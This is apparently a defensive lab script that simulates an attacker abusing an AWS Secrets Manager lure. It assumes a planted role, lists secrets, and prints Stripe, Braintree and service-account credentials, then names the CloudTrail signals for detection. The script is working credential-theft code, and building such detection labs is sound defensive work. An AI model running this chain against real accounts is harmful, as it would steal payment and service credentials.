#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 2 (Secrets Manager Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 2 — ABUSE CHAIN"
echo "  Secrets Manager Payment Credentials Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: payment-secrets-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/payment-secrets-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing all secrets (secretsmanager:ListSecrets)"
# ---------------------------------------------------------------
attack "secretsmanager:ListSecrets"
aws secretsmanager list-secrets \
  --query "SecretList[*].[Name,Description]" \
  --output table

# ---------------------------------------------------------------
step "4" "Reading secret: prod/payment-gateway/stripe-keys"
# ---------------------------------------------------------------
attack "secretsmanager:GetSecretValue → prod/payment-gateway/stripe-keys"
echo ""
echo -e "${YELLOW}--- Stripe Keys ---${NC}"
aws secretsmanager get-secret-value \
  --secret-id "prod/payment-gateway/stripe-keys" \
  --query "SecretString" --output text | jq .

# ---------------------------------------------------------------
step "5" "Reading secret: prod/payment-gateway/braintree-credentials"
# ---------------------------------------------------------------
attack "secretsmanager:GetSecretValue → prod/payment-gateway/braintree-credentials"
echo ""
echo -e "${YELLOW}--- Braintree Credentials ---${NC}"
aws secretsmanager get-secret-value \
  --secret-id "prod/payment-gateway/braintree-credentials" \
  --query "SecretString" --output text | jq .

# ---------------------------------------------------------------
step "6" "Reading secret: prod/internal-api/service-accounts"
# ---------------------------------------------------------------
attack "secretsmanager:GetSecretValue → prod/internal-api/service-accounts"
echo ""
echo -e "${YELLOW}--- Service Account Credentials ---${NC}"
aws secretsmanager get-secret-value \
  --secret-id "prod/internal-api/service-accounts" \
  --query "SecretString" --output text | jq .

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on payment-secrets-readonly-role"
echo "  • CloudTrail: ListSecrets"
echo "  • CloudTrail: GetSecretValue × 3 (stripe, braintree, service-accounts)"
echo ""
